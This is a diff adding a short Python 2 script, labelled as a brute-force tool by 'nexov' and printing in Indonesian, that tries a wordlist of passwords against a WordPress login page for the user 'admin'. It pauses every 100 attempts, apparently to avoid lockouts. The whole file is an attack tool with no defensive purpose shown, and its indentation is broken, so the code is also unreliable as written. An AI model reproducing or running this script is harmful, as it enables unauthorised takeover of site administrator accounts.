@@ -1,0 +1,42 @@
+============================
+script bruteforce by nexov
+============================
+  
+
+import requests
+import time
+
+
+with open ("data.txt", "r") as myfile:
+    data=myfile.readlines()
+
+cond = "true"
+s=0
+while cond:
+ z = data[s].rstrip('\n')
+ try:
+
+ 
+  r = requests.post("http://targetsite.net/wp-login.php", data = {"log":"admin","pwd":z})
+
+  if "incorrect" in r.content:
+   print "Password yang dicoba : "+z
+   print "Hasil : Gagal"
+   
+  elif "empty" in r.content:
+   print "Password yang dicoba : "+z
+   print "Hasil : Gagal"
+  elif "login_error" in r.content:
+   print "Password yang dicoba : "+z
+   print "Hasil : Gagal"
+  else:
+   print r.content
+   print "Password ditemukan :"+z
+
+   break
+  # time.sleep(1)
+  if s%100==0:
+   time.sleep(10)
+  s=s+1
+  except requests.exceptions.RequestException as e:    
+  print e
